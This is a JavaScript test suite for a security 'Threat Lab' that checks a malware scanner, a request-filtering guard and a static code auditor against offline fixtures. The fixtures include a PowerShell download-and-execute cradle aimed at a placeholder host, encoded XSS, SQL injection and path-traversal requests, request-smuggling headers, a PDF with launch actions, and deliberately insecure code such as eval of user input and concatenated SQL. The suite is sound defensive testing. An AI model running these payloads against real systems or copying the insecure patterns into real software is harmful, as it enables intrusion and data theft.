import test from "node:test";
import { persistThreatLabReport } from "./helpers/persist-report.js";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, rm, writeFile } from "node:fs/promises";
import { createHash } from "node:crypto";
import os from "node:os";
import path from "node:path";
import { Readable, Writable } from "node:stream";
import { createThreatLab } from "../src/index.js";
import { EICAR_TEST_STRING } from "../src/fixtures.js";
import { createMalwareEngine } from "../../malware-engine/src/index.js";
import { createSecurityGuardScanner } from "../../malware-engine/src/security-guard-adapter.js";
import { createSecurityGuard } from "../../security-guard/src/index.js";
import { createUploadInspector } from "../../security-guard/src/upload-inspector.js";
import { createOriginProtection } from "../../security-guard/src/origin-protection.js";
import { createCsrfProtection } from "../../security-guard/src/csrf-protection.js";
import { auditProject } from "../../../src/adapters/filesystem/audit-project.js";
import { auditDatabaseProject } from "../../../src/adapters/filesystem/audit-database.js";
import { comparePngBuffers } from "../../../src/adapters/visual/png-diff.js";
import projectAuditConfig from "../../../config/project-audit.config.json" with { type: "json" };
import pngjs from "pngjs";

const { PNG } = pngjs;

const PNG_HEADER = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
const TEST_MARKER = Buffer.from("deadbeef", "hex");
const HASH_FIXTURE = Buffer.from("JB Threat Lab exact SHA-256 fixture; inert bytes only.");
const HASH_FIXTURE_SHA256 = createHash("sha256").update(HASH_FIXTURE).digest("hex");
const EXPECTED_EICAR = Buffer.from(
  "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=",
  "base64"
);

function makePng(changed = false) {
  const image = new PNG({ width: 2, height: 2 });
  for (let index = 0; index < image.data.length; index += 4) {
    image.data[index] = 20;
    image.data[index + 1] = 40;
    image.data[index + 2] = 60;
    image.data[index + 3] = 255;
  }
  if (changed) {
    image.data[0] = 250;
    image.data[1] = 0;
    image.data[2] = 0;
  }
  return PNG.sync.write(image);
}

async function createWorkspace(t) {
  const root = await mkdtemp(path.join(os.tmpdir(), "jb-threat-lab-engines-"));
  t.after(() => rm(root, { recursive: true, force: true }));
  return root;
}

function outcome(status, summary, metrics = {}, findings = []) {
  return { status, summary, metrics, findings };
}

function createMemoryStore() {
  const quarantine = new Map();
  const approved = new Map();
  return {
    quarantine,
    approved,
    createWriteStream({ uploadId }) {
      const chunks = [];
      return new Writable({
        write(chunk, encoding, callback) {
          chunks.push(Buffer.from(chunk));
          callback();
        },
        final(callback) {
          quarantine.set(uploadId, Buffer.concat(chunks));
          callback();
        }
      });
    },
    async createReadStream({ uploadId }) {
      const bytes = quarantine.get(uploadId);
      if (!bytes) throw new Error("fixture missing from quarantine");
      return Readable.from([bytes]);
    },
    async promote({ uploadId, metadata, expectedSha256, expectedSize }) {
      const bytes = quarantine.get(uploadId);
      if (!bytes || bytes.length !== expectedSize) return { promoted: false };
      approved.set(uploadId, { bytes, metadata, expectedSha256 });
      quarantine.delete(uploadId);
      return { promoted: true };
    },
    async delete({ uploadId }) {
      quarantine.delete(uploadId);
      return { deleted: true };
    }
  };
}

function simulateGuardRequest(guard, url, {
  method = "GET",
  headers = {},
  rawHeaders = [],
  remoteAddress = "127.0.0.1"
} = {}) {
  const response = {
    statusCode: 200,
    headersSent: false,
    writableEnded: false,
    headers: {},
    body: "",
    setHeader(name, value) { this.headers[String(name).toLowerCase()] = value; },
    end(body = "") { this.body = String(body); this.writableEnded = true; }
  };
  let reachedApplication = false;
  guard.middleware({
    url,
    method,
    headers,
    rawHeaders,
    socket: { remoteAddress }
  }, response, () => { reachedApplication = true; });
  return { statusCode: response.statusCode, headers: response.headers, body: response.body, reachedApplication };
}

async function auditFixture(projectPath) {
  return auditProject(projectPath, {
    config: {
      ...projectAuditConfig,
      profile: "jb-threat-lab-static-fixture",
      advisories: { enabled: false, required: false }
    },
    scanOptions: {
      maxFiles: 100,
      maxFileBytes: 1_000_000,
      maxTotalBytes: 2_000_000,
      maxDepth: 5
    }
  });
}

test("JB Threat Lab exercises Malware Engine, Security Guard and Expert QA against safe local fixtures", async (t) => {
  const root = await createWorkspace(t);
  const malwareFixtures = path.join(root, "malware-fixtures");
  const malwareQuarantine = path.join(root, "malware-quarantine");
  const guardTemp = path.join(root, "guard-temp");
  const expertProject = path.join(root, "expert-project");
  const expertDatabaseProject = path.join(root, "expert-database-project");
  const expertCompositeProject = path.join(root, "expert-composite-project");
  await Promise.all([
    mkdir(malwareFixtures),
    mkdir(guardTemp),
    mkdir(path.join(expertProject, "src"), { recursive: true }),
    mkdir(path.join(expertProject, "lang", "es"), { recursive: true }),
    mkdir(path.join(expertProject, "lang", "en"), { recursive: true }),
    mkdir(path.join(expertDatabaseProject, "src"), { recursive: true }),
    mkdir(path.join(expertCompositeProject, "src"), { recursive: true })
  ]);

  assert.deepEqual(Buffer.from(EICAR_TEST_STRING), EXPECTED_EICAR,
    "Threat Lab's EICAR fixture must match the exact harmless test string");

  const malwareEngine = createMalwareEngine({ quarantineDir: malwareQuarantine });
  const hashSignatureEngine = createMalwareEngine({
    quarantineDir: path.join(root, "hash-signature-quarantine"),
    hashSignatures: { [HASH_FIXTURE_SHA256]: "ThreatLab.ExactHashFixture" }
  });
  const sizeBoundedMalwareEngine = createMalwareEngine({
    quarantineDir: path.join(root, "size-bounded-quarantine"),
    maxFileBytes: 32
  });
  const uploadMalwareEngine = createMalwareEngine({
    quarantineDir: path.join(root, "upload-engine-quarantine"),
    byteSignatures: [{
      id: "threat-lab-upload-marker",
      name: "ThreatLab.TestMarker",
      patternHex: TEST_MARKER.toString("hex")
    }]
  });
  const guardScanner = createSecurityGuardScanner({
    malwareEngine: uploadMalwareEngine,
    tempDirectory: guardTemp,
    maxBytes: 1024 * 1024,
    engineName: "JB Threat Lab Fixture Scanner",
    version: "0.1.0"
  });
  const guard = createSecurityGuard({
    mode: "balanced",
    rateLimit: { enabled: false }
  });
  const lab = createThreatLab({ name: "JB Threat Lab", version: "0.1.0" });

  lab.registerTarget({
    id: "jb-malware-engine",
    kind: "security-engine",
    version: "0.6.2",
    capabilities: ["static-file-triage", "hash-signatures", "byte-signatures", "heuristics"],
    adapter: {
      async runScenario({ scenario }) {
        let extension = ".txt";
        let bytes;
        let expectedStatus;
        let engine = malwareEngine;
        let expectedReason;
        if (scenario.id === "malware.eicar.harmless-test") {
          bytes = EXPECTED_EICAR;
          expectedStatus = "malicious";
          extension = ".com";
        } else if (scenario.id === "malware.benign.no-false-positive") {
          bytes = Buffer.from("JB Threat Lab benign text fixture; inert data only.");
          expectedStatus = "no_match";
        } else if (scenario.id === "malware.suspicious.inert-script") {
          bytes = Buffer.from("IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')");
          expectedStatus = "suspicious";
          extension = ".ps1";
        } else if (scenario.id === "malware.hash-signature.exact-match") {
          bytes = HASH_FIXTURE;
          expectedStatus = "malicious";
          engine = hashSignatureEngine;
          extension = ".bin";
        } else if (scenario.id === "malware.coverage.size-limit-unknown") {
          bytes = Buffer.alloc(128, 0x41);
          expectedStatus = "unknown";
          expectedReason = "size_limit";
          engine = sizeBoundedMalwareEngine;
        } else if (scenario.id === "malware.pdf.active-actions-suspicious") {
          bytes = Buffer.from("%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /JavaScript 3 0 R /Launch 4 0 R >>\nendobj\n%%EOF\n", "latin1");
          expectedStatus = "suspicious";
          extension = ".pdf";
        } else {
          return outcome("skip", "No Malware Engine handler for this scenario");
        }
        const fixturePath = path.join(malwareFixtures, scenario.id.replaceAll(".", "-") + extension);
        await writeFile(fixturePath, bytes, { flag: "wx" });
        const report = await engine.scanFile(fixturePath);
        const passed = report.status === expectedStatus &&
          (expectedReason === undefined || report.reason === expectedReason) &&
          (scenario.id !== "malware.pdf.active-actions-suspicious" ||
            (report.detections.length === 0 && report.pdfAnalysis?.indicators.length >= 3));
        return outcome(
          passed ? "pass" : "fail",
          passed ? "Malware Engine returned the expected static triage status" : "Unexpected Malware Engine status or coverage reason",
          {
            actualStatus: report.status,
            expectedStatus,
            reason: report.reason ?? null,
            expectedReason: expectedReason ?? null,
            bytes: report.bytes,
            heuristicScore: report.heuristicScore ?? null,
            detections: report.detections?.length ?? 0,
            pdfIndicators: report.pdfAnalysis?.indicators.length ?? null
          },
          passed ? [] : [{
            code: "MALWARE_STATUS_MISMATCH",
            expected: expectedStatus,
            actual: report.status,
            expectedReason: expectedReason ?? null,
            actualReason: report.reason ?? null
          }]
        );
      }
    }
  });

  lab.registerTarget({
    id: "jb-security-guard",
    kind: "runtime-security",
    version: "0.1.0",
    capabilities: ["request-filtering", "upload-inspection", "fail-closed"],
    adapter: {
      async runScenario({ scenario }) {
        const requestCases = {
          "guard.request.xss-block": {
            url: "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            expectedStatus: 403
          },
          "guard.request.sqli-block": {
            url: "/search?q=%27%20OR%201%3D1",
            expectedStatus: 403
          },
          "guard.request.path-traversal-block": {
            url: "/files/%2e%2e/%2e%2e/private.txt",
            expectedStatus: 403
          },
          "guard.request.ambiguous-framing-block": {
            url: "/upload",
            method: "POST",
            headers: { "content-length": "5", "transfer-encoding": "chunked" },
            rawHeaders: ["Host", "example.test", "Content-Length", "5", "Transfer-Encoding", "chunked"],
            expectedStatus: 400
          }
        };
        if (requestCases[scenario.id]) {
          const requestCase = requestCases[scenario.id];
          const result = simulateGuardRequest(guard, requestCase.url, requestCase);
          const passed = result.statusCode === requestCase.expectedStatus && !result.reachedApplication;
          return outcome(passed ? "pass" : "fail", passed
            ? "Security Guard blocked the synthetic request at the expected boundary"
            : "Security Guard did not block the synthetic request as expected",
          {
            statusCode: result.statusCode,
            expectedStatus: requestCase.expectedStatus,
            reachedApplication: result.reachedApplication
          },
          passed ? [] : [{
            code: "GUARD_REQUEST_NOT_BLOCKED",
            expectedStatus: requestCase.expectedStatus,
            actualStatus: result.statusCode
          }]);
        }

        if (scenario.id === "guard.upload.malicious-block" || scenario.id === "guard.upload.unknown-quarantine") {
          const malicious = scenario.id === "guard.upload.malicious-block";
          const store = createMemoryStore();
          const inspector = createUploadInspector({
            store,
            scanner: guardScanner,
            maxBytes: 1024,
            scannerTimeoutMs: 5000,
            ingestTimeoutMs: 5000,
            allowedMimeTypes: ["image/png"]
          });
          const bytes = malicious
            ? Buffer.concat([PNG_HEADER, Buffer.from("TEST"), TEST_MARKER])
            : Buffer.concat([PNG_HEADER, Buffer.from("BENIGN-THREAT-LAB-FIXTURE")]);
          let actualCode = "none";
          try {
            await inspector.inspect({
              source: Readable.from([bytes]),
              fileName: "catalog-fixture.png",
              declaredMimeType: "image/png"
            });
          } catch (error) {
            actualCode = error.code ?? "unknown";
          }
          const expectedCode = malicious ? "MALWARE_DETECTED" : "SCAN_NOT_CLEAN";
          const passed = actualCode === expectedCode
            && store.approved.size === 0
            && (malicious ? store.quarantine.size === 0 : store.quarantine.size === 1);
          return outcome(passed ? "pass" : "fail",
            malicious
              ? "Malicious test marker was blocked and never promoted"
              : "No-match mapped to unknown and remained quarantined",
            { actualCode, expectedCode, approved: store.approved.size, quarantined: store.quarantine.size },
            passed ? [] : [{ code: "GUARD_UPLOAD_POLICY_MISMATCH" }]);
        }

        if (scenario.id === "guard.origin-csrf.composed-policy") {
          const allowedOrigin = "https://catalog.example";
          const originProtection = createOriginProtection({ allowedOrigins: [allowedOrigin] });
          const csrfProtection = createCsrfProtection({
            secret: Buffer.alloc(32, 0x5a),
            sessionKeyGenerator: (request) => request.sessionId
          });
          function runChain({ method = "POST", origin, sessionId, token }) {
            const request = {
              url: "/account/profile",
              method,
              headers: {},
              sessionId,
              socket: { remoteAddress: "127.0.0.1" }
            };
            if (origin !== null) request.headers.origin = origin;
            if (token !== null) request.headers[csrfProtection.headerName] = token;
            const response = {
              statusCode: 200,
              headersSent: false,
              writableEnded: false,
              headers: {},
              body: "",
              setHeader(name, value) { this.headers[String(name).toLowerCase()] = value; },
              end(body = "") { this.body = String(body); this.writableEnded = true; }
            };
            let reachedApplication = false;
            originProtection.middleware(request, response, () => {
              csrfProtection.middleware(request, response, () => { reachedApplication = true; });
            });
            return { statusCode: response.statusCode, reachedApplication };
          }
          const sessionId = "threat-lab-session-001";
          const validToken = csrfProtection.createToken({ sessionId });
          const validWrite = runChain({ origin: allowedOrigin, sessionId, token: validToken });
          const rejectedOrigin = runChain({ origin: "https://attacker.example", sessionId, token: validToken });
          const rejectedToken = runChain({ origin: allowedOrigin, sessionId, token: "A".repeat(43) });
          const safeRead = runChain({ method: "GET", origin: "https://attacker.example", sessionId, token: null });
          const originStats = originProtection.getStats();
          const csrfStats = csrfProtection.getStats();
          const passed = validWrite.statusCode === 200 && validWrite.reachedApplication
            && rejectedOrigin.statusCode === 403 && !rejectedOrigin.reachedApplication
            && rejectedToken.statusCode === 403 && !rejectedToken.reachedApplication
            && safeRead.statusCode === 200 && safeRead.reachedApplication
            && originStats.requests === 4 && originStats.allowed === 3 && originStats.blocked === 1
            && csrfStats.requests === 3 && csrfStats.allowed === 2 && csrfStats.blocked === 1;
          return outcome(
            passed ? "pass" : "fail",
            passed
              ? "Origin allowlisting and session-bound CSRF validation compose correctly with safe-method false-positive controls"
              : "Composed origin/CSRF enforcement or its control path violated the expected policy",
            {
              requestStatuses: [validWrite.statusCode, rejectedOrigin.statusCode, rejectedToken.statusCode, safeRead.statusCode],
              applicationReachCount: [validWrite, rejectedOrigin, rejectedToken, safeRead].filter((item) => item.reachedApplication).length,
              originStats, csrfStats, networkRequests: 0
            },
            passed ? [] : [{ code: "GUARD_ORIGIN_CSRF_CHAIN_MISMATCH" }]
          );
        }

        if (scenario.id === "guard.rate-limit.capacity-reset-invariants") {
          const events = [];
          const boundedGuard = createSecurityGuard({
            mode: "strict",
            rateLimit: { enabled: true, max: 2, windowMs: 60_000, maxKeys: 1 },
            keyGenerator: (request) => request.socket?.remoteAddress ?? "unknown",
            onEvent: (event) => events.push(event)
          });
          const requests = [
            simulateGuardRequest(boundedGuard, "/health", { remoteAddress: "192.0.2.10" }),
            simulateGuardRequest(boundedGuard, "/health", { remoteAddress: "192.0.2.10" }),
            simulateGuardRequest(boundedGuard, "/health", { remoteAddress: "192.0.2.10" }),
            simulateGuardRequest(boundedGuard, "/health", { remoteAddress: "192.0.2.11" }),
            simulateGuardRequest(boundedGuard, "/health", { remoteAddress: "192.0.2.12" })
          ];
          const saturatedStats = boundedGuard.getStats();
          const saturatedEventCount = events.length;
          boundedGuard.reset();
          const resetStats = boundedGuard.getStats();
          const releasedClient = simulateGuardRequest(boundedGuard, "/health", { remoteAddress: "192.0.2.11" });
          const afterReleaseStats = boundedGuard.getStats();
          const passed = requests.map((item) => item.statusCode).join(",") === "200,200,429,429,429"
            && requests.slice(0, 2).every((item) => item.reachedApplication)
            && requests.slice(2).every((item) => !item.reachedApplication)
            && saturatedStats.requests === 5
            && saturatedStats.blocked === 3
            && saturatedStats.rateLimitKeys === 1
            && saturatedStats.byRule["JBG-RATE-001"] === 1
            && saturatedStats.byRule["JBG-RATE-002"] === 2
            && saturatedEventCount === 2
            && resetStats.requests === 0 && resetStats.blocked === 0 && resetStats.rateLimitKeys === 0
            && releasedClient.statusCode === 200 && releasedClient.reachedApplication
            && afterReleaseStats.rateLimitKeys === 1;
          return outcome(
            passed ? "pass" : "fail",
            passed
              ? "Rate-limit state stayed bounded, identity rotation failed closed, duplicate alerts were suppressed, and reset released capacity"
              : "Rate-limit capacity, alert suppression, or reset invariants did not match expectations",
            {
              requestStatuses: requests.map((item) => item.statusCode),
              blocked: saturatedStats.blocked,
              rateLimitKeys: saturatedStats.rateLimitKeys,
              rateLimitExceeded: saturatedStats.byRule["JBG-RATE-001"] ?? 0,
              capacityExceeded: saturatedStats.byRule["JBG-RATE-002"] ?? 0,
              uniqueEvents: saturatedEventCount,
              resetKeys: resetStats.rateLimitKeys,
              releasedClientStatus: releasedClient.statusCode,
              postResetKeys: afterReleaseStats.rateLimitKeys,
              networkRequests: 0
            },
            passed ? [] : [{ code: "GUARD_RATE_LIMIT_STATE_MISMATCH" }]
          );
        }

        return outcome("skip", "No Security Guard handler for this scenario");
      }
    }
  });

  lab.registerTarget({
    id: "jb-expert-qa",
    kind: "qa-engine",
    version: "0.2.0",
    capabilities: ["local-static-audit", "security-rules", "regression-check"],
    adapter: {
      async runScenario({ scenario }) {
        if (scenario.id === "expert-qa.database.dynamic-query-and-tls") {
          const source = [
            "const pool = new pg.Pool({ ssl: false });",
            'export function findUser(input) { return pool.query("SELECT * FROM users WHERE name = " + input); }'
          ].join("\n");
          await writeFile(path.join(expertDatabaseProject, "src", "db.js"), source);
          const report = await auditDatabaseProject(expertDatabaseProject, {
            config: {
              ...projectAuditConfig,
              profile: "jb-threat-lab-database-fixture",
              advisories: { enabled: false, required: false }
            },
            scanOptions: {
              maxFiles: 100,
              maxFileBytes: 1_000_000,
              maxTotalBytes: 2_000_000,
              maxDepth: 5
            }
          });
          const rawQuery = report.diagnostics.some((item) => item.metadata?.detector === "dynamic-raw-query");
          const disabledTls = report.diagnostics.some((item) => item.metadata?.detector === "database-tls-disabled");
          const passed = report.databaseScope.complete && rawQuery && disabledTls &&
            report.databaseScope.databaseConnections === 0 &&
            report.databaseScope.networkRequests === 0;
          return outcome(passed ? "pass" : "fail",
            passed
              ? "Expert QA detected dynamic raw SQL and disabled database TLS without connecting to a database"
              : "Expert QA database audit did not return both expected static findings",
            {
              complete: report.databaseScope.complete,
              rawQueryDetected: rawQuery,
              disabledTlsDetected: disabledTls,
              evidenceFiles: report.databaseScope.databaseEvidenceFiles,
              databaseConnections: report.databaseScope.databaseConnections,
              networkRequests: report.databaseScope.networkRequests
            },
            passed ? [] : [{
              code: "EXPERT_QA_DATABASE_AUDIT_MISMATCH",
              rawQuery,
              disabledTls,
              complete: report.databaseScope.complete
            }]);
        }

        if (scenario.id === "expert-qa.visual.deterministic-diff") {
          const baseline = makePng(false);
          const changed = makePng(true);
          const identical = comparePngBuffers(baseline, baseline);
          const difference = comparePngBuffers(baseline, changed, { maxDiffPixelRatio: 0 });
          const passed = identical.passed === true &&
            difference.passed === false &&
            difference.diffPixels > 0 &&
            Buffer.isBuffer(difference.diffBuffer);
          return outcome(passed ? "pass" : "fail",
            passed
              ? "Expert QA visual comparison deterministically detected a local pixel difference"
              : "Expert QA visual comparison did not report the expected pixel difference",
            {
              identicalPassed: identical.passed,
              changedPassed: difference.passed,
              changedPixels: difference.diffPixels,
              changedPixelRatio: difference.diffPixelRatio,
              aiCalls: 0
            },
            passed ? [] : [{ code: "EXPERT_QA_VISUAL_DIFF_MISMATCH" }]);
        }

        if (scenario.id === "expert-qa.language.translation-integrity") {
          await mkdir(path.join(expertProject, "lang", "es"), { recursive: true });
          await mkdir(path.join(expertProject, "lang", "en"), { recursive: true });
          await writeFile(path.join(expertProject, "lang", "es", "messages.php"), `<?php
return [
  'greeting' => 'Hola :name',
  'count' => 'Total :count',
  'description' => 'Descripción del producto',
];
`);
          await writeFile(path.join(expertProject, "lang", "en", "messages.php"), `<?php
return [
  'greeting' => 'Hello :name',
  'count' => 'Total',
  'legacy' => 'Old label',
];
`);
          const report = await auditFixture(expertProject);
          const languageAudit = report.languageAudit;
          const missingKey = languageAudit?.findings?.some((item) =>
            item.id === "missing-key" && item.key === "description"
          ) ?? false;
          const placeholderMismatch = languageAudit?.findings?.some((item) =>
            item.id === "placeholder-mismatch" && item.key === "count"
          ) ?? false;
          const specialistFinding = report.diagnostics.some((item) =>
            typeof item.id === "string" && item.id.startsWith("LANG-")
          );
          const passed = languageAudit?.status === "checked"
            && languageAudit.sourceLocale === "es-419"
            && languageAudit.targetLocale === "en"
            && missingKey
            && placeholderMismatch
            && specialistFinding;
          return outcome(
            passed ? "pass" : "fail",
            passed
              ? "Expert QA detected a missing locale key and placeholder mismatch through its project auditor"
              : "Language QA findings were not propagated through the Expert QA project audit",
            {
              status: languageAudit?.status ?? null,
              sourceLocale: languageAudit?.sourceLocale ?? null,
              targetLocale: languageAudit?.targetLocale ?? null,
              missingKey,
              placeholderMismatch,
              specialistFinding,
              glossaryFindings: languageAudit?.summary?.glossaryReview ?? 0
            },
            passed ? [] : [{
              code: "EXPERT_QA_LANGUAGE_AUDIT_MISMATCH",
              status: languageAudit?.status ?? null,
              missingKey,
              placeholderMismatch,
              specialistFinding
            }]
          );
        }


        if (scenario.id === "expert-qa.static.compound-security-regression") {
          const unsafeSource = [
            'const api = "http://api.example.com/v1";',
            'res.setHeader("Access-Control-Allow-Origin", "*");',
            'res.setHeader("Access-Control-Allow-Credentials", "true");',
            'res.setHeader("Set-Cookie", "session=abc; Path=/");',
            'const passwordHash = crypto.createHash("md5").update(password).digest("hex");',
            'const resetToken = Math.random().toString(36);',
            'const claims = jwt.decode(token);',
            'if (claims.role === "admin") grantAccess();',
            'res.redirect(req.query.next);',
            'fetch(req.query.url);',
            'const output = eval(userInput);',

          ].join("\n");
          const safeSource = [
            'const api = "https://api.example.com/v1";',
            'res.cookie("session", sessionValue, { httpOnly: true, secure: true, sameSite: "lax" });',
            'const passwordHash = await argon2.hash(password);',
            'const resetToken = crypto.randomBytes(32).toString("hex");',
            'const claims = jwt.verify(token, publicKey, { algorithms: ["RS256"] });',
            'const next = allowedRedirects.has(req.query.next) ? req.query.next : "/";',
            'fetch(TRUSTED_SERVICE_URL);',
            'element.textContent = userInput;'
          ].join("\n");
          const htmlSinkSource = "document.querySelector('#result').innerHTML = location.search;\\n";
          await writeFile(path.join(expertCompositeProject, "src", "unsafe.js"), unsafeSource);
          await writeFile(path.join(expertCompositeProject, "src", "safe.js"), safeSource);
          await writeFile(path.join(expertCompositeProject, "src", "html-sink.js"), htmlSinkSource);
          const first = await auditFixture(expertCompositeProject);
          const second = await auditFixture(expertCompositeProject);
          const expectedPrefixes = [
            "SEC-HTTP-", "SEC-CORS-", "SEC-COOKIE-", "SEC-PASSWORD-HASH-",
            "SEC-RANDOM-", "SEC-JWT-", "SEC-REDIRECT-", "SEC-SSRF-"
          ];
          const detected = expectedPrefixes.map((prefix) =>
            first.diagnostics.some((item) => item.id.startsWith(prefix))
          );
          const evalDetected = first.diagnostics.some((item) => item.title === "Dynamic eval execution");
          const htmlSinkDetected = first.diagnostics.some((item) =>
            item.metadata?.detector === "html-sink-context"
            && item.metadata?.classification === "unescaped-untrusted-source"
            && item.location === "src/html-sink.js:1"
          );
          const safeControlFindings = first.diagnostics.filter((item) =>
            typeof item.location === "string"
            && item.location.startsWith("src/safe.js:")
            && (expectedPrefixes.some((prefix) => item.id.startsWith(prefix))
              || item.title === "Dynamic eval execution"
              || item.metadata?.detector === "html-sink-context")
          );
          const normalizeFindings = (report) => report.diagnostics
            .map(({ id, title, location, severity }) => ({ id, title, location, severity }))
            .sort((left, right) => JSON.stringify(left).localeCompare(JSON.stringify(right)));
          const deterministic = JSON.stringify(normalizeFindings(first)) === JSON.stringify(normalizeFindings(second));
          const passed = first.analysisScope.complete && second.analysisScope.complete
            && first.analysisScope.filesAnalyzed === 3
            && expectedPrefixes.every((_, index) => detected[index])
            && evalDetected && htmlSinkDetected
            && safeControlFindings.length === 0
            && deterministic
            && first.analysisScope.networkRequests === 0
            && second.analysisScope.networkRequests === 0
            && first.analysisScope.dependencyAdvisoryLookup === false;
          return outcome(
            passed ? "pass" : "fail",
            passed
              ? "Expert QA detected the compound static-security fixture, preserved safe controls, and produced repeatable offline findings"
              : "Compound static audit, safe-control suppression, coverage, or deterministic report invariants failed",
            {
              filesAnalyzed: first.analysisScope.filesAnalyzed,
              expectedSecurityFamilies: expectedPrefixes.length,
              detectedSecurityFamilies: detected.filter(Boolean).length,
              evalDetected, htmlSinkDetected,
              safeControlFindings: safeControlFindings.length,
              deterministic, scanComplete: first.analysisScope.complete,
              networkRequests: first.analysisScope.networkRequests
            },
            passed ? [] : [{
              code: "EXPERT_QA_COMPOUND_AUDIT_MISMATCH",
              detected, evalDetected, htmlSinkDetected,
              safeControlFindings: safeControlFindings.length,
              deterministic, scanComplete: first.analysisScope.complete
            }]
          );
        }

        if (scenario.id !== "expert-qa.static.unsafe-html-detected" &&
            scenario.id !== "expert-qa.static.repaired-html-regression") {
          return outcome("skip", "No Expert QA handler for this scenario");
        }
        const vulnerable = scenario.id === "expert-qa.static.unsafe-html-detected";
        const source = vulnerable
          ? "document.querySelector('#result').innerHTML = location.search;\n"
          : "document.querySelector('#result').textContent = location.search;\n";
        await writeFile(path.join(expertProject, "src", "app.js"), source);
        const report = await auditFixture(expertProject);
        const findings = report.diagnostics.filter((item) =>
          item.metadata?.detector === "html-sink-context"
        );
        const passed = vulnerable
          ? findings.some((item) => item.metadata?.classification === "unescaped-untrusted-source")
          : findings.length === 0;
        return outcome(passed ? "pass" : "fail",
          vulnerable
            ? "Expert QA detected the intentionally vulnerable dynamic HTML sink"
            : "Expert QA found no dynamic HTML sink after the safe textContent repair",
          { htmlSinkFindings: findings.length, analyzedFiles: report.analysisScope.filesAnalyzed },
          passed ? [] : [{ code: "EXPERT_QA_HTML_REGRESSION_MISMATCH", findings: findings.length }]);
      }
    }
  });

  const scenarios = [
    ["malware.eicar.harmless-test", "malware-static", "Detect the harmless EICAR test string.", "jb-malware-engine", "basic"],
    ["malware.benign.no-false-positive", "malware-static", "Do not flag a benign inert text fixture.", "jb-malware-engine", "basic"],
    ["malware.suspicious.inert-script", "malware-static", "Classify inert suspicious script text as suspicious, never confirmed malicious.", "jb-malware-engine", "intermediate"],
    ["malware.hash-signature.exact-match", "malware-signatures", "Confirm an exact configured SHA-256 fixture signature.", "jb-malware-engine", "intermediate"],
    ["malware.coverage.size-limit-unknown", "malware-coverage", "Return unknown when a file exceeds the configured scan budget.", "jb-malware-engine", "advanced"],
    ["malware.pdf.active-actions-suspicious", "document-triage", "Classify PDF active-action indicators as suspicious, never confirmed malicious.", "jb-malware-engine", "advanced"],
    ["guard.request.xss-block", "request-security", "Block a local synthetic XSS-pattern request.", "jb-security-guard", "basic"],
    ["guard.request.sqli-block", "request-security", "Block a local synthetic SQL injection-pattern request.", "jb-security-guard", "basic"],
    ["guard.request.path-traversal-block", "request-security", "Block a local encoded path-traversal request.", "jb-security-guard", "intermediate"],
    ["guard.request.ambiguous-framing-block", "request-security", "Reject conflicting HTTP message framing before application handling.", "jb-security-guard", "advanced"],
    ["guard.upload.malicious-block", "upload-security", "Reject a synthetic signature match before file promotion.", "jb-security-guard", "expert"],
    ["guard.upload.unknown-quarantine", "upload-security", "Keep no-match uploads quarantined rather than approving them.", "jb-security-guard", "expert"],
    ["guard.origin-csrf.composed-policy", "request-security", "Verify the interaction of origin allowlisting, session-bound CSRF tokens, safe methods, and application reachability.", "jb-security-guard", "extreme"],
    ["guard.rate-limit.capacity-reset-invariants", "request-security", "Exercise bounded rate-limit state, client-identity rotation, alert suppression, and reset recovery under a deterministic local request sequence.", "jb-security-guard", "superextreme"],
    ["expert-qa.static.unsafe-html-detected", "static-code-security", "Detect an intentionally vulnerable HTML sink in source code.", "jb-expert-qa", "basic"],
    ["expert-qa.static.repaired-html-regression", "static-code-security", "Verify a repaired textContent implementation has no HTML-sink finding.", "jb-expert-qa", "intermediate"],
    ["expert-qa.database.dynamic-query-and-tls", "database-security", "Detect dynamic raw SQL and disabled TLS through local static database audit.", "jb-expert-qa", "advanced"],
    ["expert-qa.visual.deterministic-diff", "visual-regression", "Detect a synthetic PNG pixel difference deterministically without AI.", "jb-expert-qa", "expert"],
    ["expert-qa.language.translation-integrity", "language-quality", "Detect missing locale keys and placeholder mismatches without a translation provider.", "jb-expert-qa", "extreme"],
    ["expert-qa.static.compound-security-regression", "static-code-security", "Correlate multiple insecure configurations with safe control examples and deterministic offline rescans.", "jb-expert-qa", "superextreme"]
  ];
  for (const [id, category, description, targetId, difficulty] of scenarios) {
    lab.registerScenario({
      id,
      category,
      description,
      difficulty,
      appliesTo: [targetId],
      safety: { safe: true, network: false, destructive: false, executesSample: false },
      tags: ["safe-fixture", "offline"]
    });
  }

  const report = await lab.run({
    metadata: {
      suite: "three-core-jb-engines",
      sampleExecution: false,
      networkRequests: 0,
      productionTargets: false
    }
  });
  await persistThreatLabReport(report, "core-engines");

  assert.equal(report.totals.fail, 0, JSON.stringify(report.results.filter((item) => item.status === "fail"), null, 2));
  assert.equal(report.totals.pass, scenarios.length);
  assert.equal(report.totals.skip, 3 * scenarios.length - scenarios.length);
  assert.equal(report.results.length, 3 * scenarios.length);
  assert.deepEqual(
    new Set(report.results.filter((item) => item.status === "pass").map((item) => item.target.id)),
    new Set(["jb-malware-engine", "jb-security-guard", "jb-expert-qa"])
  );

  const byTarget = new Map(report.assessment.targets.map((item) => [item.target.id, item]));
  const allSixLevels = ["basic", "intermediate", "advanced", "expert", "extreme", "superextreme"];
  for (const targetId of ["jb-security-guard", "jb-expert-qa"]) {
    const assessment = byTarget.get(targetId);
    assert.ok(assessment, `Missing assessment for ${targetId}`);
    assert.deepEqual(assessment.coveredLevels, allSixLevels);
    assert.deepEqual(assessment.missingLevels, []);
    assert.equal(assessment.ready, true);
  }

  const malwareAssessment = byTarget.get("jb-malware-engine");
  assert.ok(malwareAssessment);
  assert.deepEqual(malwareAssessment.coveredLevels, ["basic", "intermediate", "advanced"]);
  assert.deepEqual(malwareAssessment.missingLevels, ["expert", "extreme", "superextreme"]);
  assert.equal(malwareAssessment.ready, false,
    "A single three-tier suite must not claim full Malware Engine readiness");
});
